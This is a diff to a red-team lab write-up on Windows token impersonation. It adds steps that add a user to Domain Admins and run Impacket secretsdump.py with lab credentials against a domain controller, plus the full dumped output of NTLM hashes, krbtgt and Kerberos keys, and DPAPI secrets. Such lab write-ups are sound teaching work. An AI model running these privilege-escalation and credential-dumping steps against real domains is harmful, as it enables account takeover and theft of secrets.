@@ -12,6 +12,27 @@
 - [Lab Setup](#lab-setup)
 - [Attack Flow](#attack-flow)
 - [Step 1 - Get a Meterpreter Session](#step-1---get-a-meterpreter-session)
+  - [1.1 Start Metasploit](#step-11-starting-metasploit)
+  - [1.2 Search for psexec](#step-12-now-search-for-psexec)
+  - [1.3 Use exploit/windows/smb/psexec](#step-13-use-exploitwindowssmbpsexec)
+  - [1.4 View module options](#step-14-display-all-available-settings-for-a-metasploit-module)
+  - [1.5 Set required options](#step-15-setting-required-options)
+  - [1.6 Get Meterpreter session](#step-16-get-meterpreter-session)
+- [Step 2 - Check UID](#step-2-check-uid)
+- [Step 3 - Load Incognito](#step-3---load-incognito)
+- [Step 4 - List Available Tokens](#step-4---list-available-tokens)
+- [Step 5 - Impersonate Administrator Token](#step-5---impersonate-the-administrator-token)
+- [Step 6 - Verify Access](#step-6---verify-access)
+  - [6.1 Create Domain User](#step-61---create-a-domain-user)
+  - [6.2 Add User to Domain Admins Group](#step-62---add-a-user-to-the-domain-admins-group)
+- [Dump All Hashes](#dump-all-hashes)
+- [Key Takeaways](#key-takeaways)
+- [Mitigation](#mitigation)
+
+<!-- - [Introduction](#introduction)
+- [Lab Setup](#lab-setup)
+- [Attack Flow](#attack-flow)
+- [Step 1 - Get a Meterpreter Session](#step-1---get-a-meterpreter-session)
 - [Step 2 - Check UID](#step-2---check-uid)
 - [Step 3 - Load Incognito](#step-3---load-incognito)
 - [Step 4 - List Available Tokens](#step-4---list-available-tokens)
@@ -22,7 +43,7 @@
 - [Mitigation](#mitigation)
 - [Key Takeaways](#key-takeaways)
 - [References](#references)
-- [Disclaimer](#disclaimer)
+- [Disclaimer](#disclaimer) -->
 
 ## Introduction
 
@@ -453,7 +474,7 @@ Microsoft Windows [Version 10.0.19045.2965]
 C:\Windows\system32>
 ```
 
-### Create a Domain User
+### Step 6.1 - Create a Domain User
 
 The following command creates a new domain user named `testuser` with the password `@testuser#!`:
 
@@ -483,16 +504,124 @@ The command completed successfully.
   <img src="/writeups/token impersonation attack/images/step6.png" width="600">
 </p>
 
-## Add a User to the Domain Admins Group
+## Step 6.2 - Add a User to the Domain Admins Group
 
 The following command attempts to add the user `test` to the `Domain Admins` group:
 
 ```bash
 net group "Domain Admins" test /ADD /DOMAIN
 ```
- Dump all hashes:
 
- secretdump.py readteambd.local/testuser:@terstuser#!
+### Command Breakdown
+
+- `net` – Windows built-in CLI tool for managing network/domain resources.
+- `group` – Specifies you're working with a global group (domain-level group).
+- `Domain Admins` – The target group name (quotes needed because of the space).
+- `test` – The username being added to the group.
+- `/ADD` – The action — adds the user to the group.
+
+
+**Output:**
+
+```
+C:\Windows\system32>net group "Domain Admins" test /ADD /DOMAIN
+net group "Domain Admins" test /ADD /DOMAIN
+The request will be processed at a domain controller for domain READTEAMBD.local.
+
+The command completed successfully.
+```
+
+### Dump all hashes:
+
+```bash
+secretsdump.py readteambd.local/test:'@shahin123#!'@192.168.5.134
+```
+
+### Command Breakdown
+
+- `secretsdump.py` – Impacket script that remotely dumps password hashes and secrets from a Windows/AD target.
+- `readteambd.local` – Domain
+- `test` - user name
+- `@shahin123#!` - user password
+- `@192.168.5.134` - dc ip
+
+**Output:**
+
+```
+[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+[-] SAM hashes extraction failed: string index out of range
+[*] Dumping cached domain logon information (domain/username:hash)
+[*] Dumping LSA Secrets
+[*] $MACHINE.ACC 
+READTEAMBD\REDTEAMBD-DC$:aes256-cts-hmac-sha1-96:2373e4edd49e2cd50d82138c018e93b1ee56682285b57252b2a007fc19e9623c
+READTEAMBD\REDTEAMBD-DC$:aes128-cts-hmac-sha1-96:20d614ac27a44a1a2aeb2c2866c5bbbb
+READTEAMBD\REDTEAMBD-DC$:des-cbc-md5:e93bb615455edafb
+READTEAMBD\REDTEAMBD-DC$:aad3b435b51404eeaad3b435b51404ee:5d61398d1bb36494251624d87522d005:::
+[*] DPAPI_SYSTEM 
+dpapi_machinekey:0x1489248803a2447a36be0a3277c4bbea31e58dcc
+dpapi_userkey:0x658a3345d9bbc292356eab42db8971268701f757
+[*] NL$KM 
+ 0000   52 1A 7A 78 A2 BD A4 13  1C 1E 21 49 11 7B B5 91   R.zx......!I.{..
+ 0010   41 92 FC 6C BB 7D 4C B8  BC 06 BB EA CD 4D 99 E8   A..l.}L......M..
+ 0020   45 6F 6F 43 2A 4E E7 8A  C2 DE 7B 6D DC DC E7 02   EooC*N....{m....
+ 0030   9D 52 60 64 62 65 C1 25  03 88 BD B4 88 C6 E6 C5   .R`dbe.%........
+NL$KM:521a7a78a2bda4131c1e2149117bb5914192fc6cbb7d4cb8bc06bbeacd4d99e8456f6f432a4ee78ac2de7b6ddcdce7029d5260646265c1250388bdb488c6e6c5
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:5f8156b8f557baae7cd069ac724e1959:::
+READTEAMBD.local\shahin:1105:aad3b435b51404eeaad3b435b51404ee:bcb3cd5313f9537196a11fdb9fad2ac9:::
+READTEAMBD.local\sqlservice:1106:aad3b435b51404eeaad3b435b51404ee:7e449687caaf71367ad41ad9490f926d:::
+READTEAMBD.local\rahimkhan:1109:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
+READTEAMBD.local\karimkhan:1110:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
+test2:1115:aad3b435b51404eeaad3b435b51404ee:26f6b62914c0b90561b76abc3121382d:::
+test:1117:aad3b435b51404eeaad3b435b51404ee:26f6b62914c0b90561b76abc3121382d:::
+REDTEAMBD-DC$:1000:aad3b435b51404eeaad3b435b51404ee:5d61398d1bb36494251624d87522d005:::
+VICTIM-1$:1111:aad3b435b51404eeaad3b435b51404ee:af96b7d9f1e7c7d5a983c634b7db3a92:::
+VICTIM-2$:1112:aad3b435b51404eeaad3b435b51404ee:4286814f1a9fcc086127d115a63621c7:::
+[*] Kerberos keys grabbed
+Administrator:aes256-cts-hmac-sha1-96:11229cb90f90de06b490fddf1547b22c9e18e085a60747aca3f3a6e48f402f4c
+Administrator:aes128-cts-hmac-sha1-96:b529d2369b3c803fd52fff98c6abc5c4
+Administrator:des-cbc-md5:202abffea2a15b86
+krbtgt:aes256-cts-hmac-sha1-96:29bd3b3755e50fdec690dce37e2ff12b50b8aef064a18e865a575fe56576bbd4
+krbtgt:aes128-cts-hmac-sha1-96:106df1d21a66d2eeae03573c53fe4107
+krbtgt:des-cbc-md5:572cd631329bdaf8
+READTEAMBD.local\shahin:aes256-cts-hmac-sha1-96:21562f5f21641cf8eaa09e07c728110b0d5d05f152b278aa776569c6dc8784c9
+READTEAMBD.local\shahin:aes128-cts-hmac-sha1-96:ede4573cedfd8cdf0e069bd6e87f9fed
+READTEAMBD.local\shahin:des-cbc-md5:9b58c483ad37b307
+READTEAMBD.local\sqlservice:aes256-cts-hmac-sha1-96:b33f27e24d00d4df49ed7ae0288d148f2db992c2e59c6d5a70d52adb9ba08ad8
+READTEAMBD.local\sqlservice:aes128-cts-hmac-sha1-96:71f693c2a57c772f1cab00537701cc19
+READTEAMBD.local\sqlservice:des-cbc-md5:bfd9e0d55ea86b1a
+READTEAMBD.local\rahimkhan:aes256-cts-hmac-sha1-96:a5c93fa6eb16c9a14c00d724a9ec629c095d72dcdfdaaff9a402888040fc789b
+READTEAMBD.local\rahimkhan:aes128-cts-hmac-sha1-96:a13f44b8df15afb92d8daa0dd090d6b7
+READTEAMBD.local\rahimkhan:des-cbc-md5:0162750ec70862c4
+READTEAMBD.local\karimkhan:aes256-cts-hmac-sha1-96:91c22ad68031881bba444a9b574dbe6910b34b74d17c7b336f571e5ffe378746
+READTEAMBD.local\karimkhan:aes128-cts-hmac-sha1-96:9fcf640bc4481a0f54cfe5dd6484c801
+READTEAMBD.local\karimkhan:des-cbc-md5:76cd582a29dccece
+test2:aes256-cts-hmac-sha1-96:15b0a3fd636086443cb04ff4e9a4f2fce721360af8b4034f4712239641b76bfb
+test2:aes128-cts-hmac-sha1-96:a1fd53423759c711cd6b7f81ab596aa3
+test2:des-cbc-md5:98461c1f947c978c
+test:aes256-cts-hmac-sha1-96:a7309d070aadb025a17b0f126dc627c44486e5278fdb431638879b46b1fed9c7
+test:aes128-cts-hmac-sha1-96:c110e4ca65344d639af67fe72b53230e
+test:des-cbc-md5:4558c18a5107207a
+REDTEAMBD-DC$:aes256-cts-hmac-sha1-96:2373e4edd49e2cd50d82138c018e93b1ee56682285b57252b2a007fc19e9623c
+REDTEAMBD-DC$:aes128-cts-hmac-sha1-96:20d614ac27a44a1a2aeb2c2866c5bbbb
+REDTEAMBD-DC$:des-cbc-md5:b5a2f2fdabf27ad5
+VICTIM-1$:aes256-cts-hmac-sha1-96:309fc79973c1ca1460b3dad9deb74ab87ebdf81ae5c833461084d755efb1695e
+VICTIM-1$:aes128-cts-hmac-sha1-96:2cc7c1753f6ab893c73633969b241975
+VICTIM-1$:des-cbc-md5:b675ce1083ad4a5e
+VICTIM-2$:aes256-cts-hmac-sha1-96:8decb9f00c39233817ca1a32114dd607ed4bec34e22a3efea30e73da529ca487
+VICTIM-2$:aes128-cts-hmac-sha1-96:7fc817241159420e47632ca236d71258
+VICTIM-2$:des-cbc-md5:7ac1431fd0f20298
+```
+
+<p align="center">
+  <img src="/writeups/token impersonation attack/images/step6.png" width="600">
+</p>
 
 
 # Key Takeaways
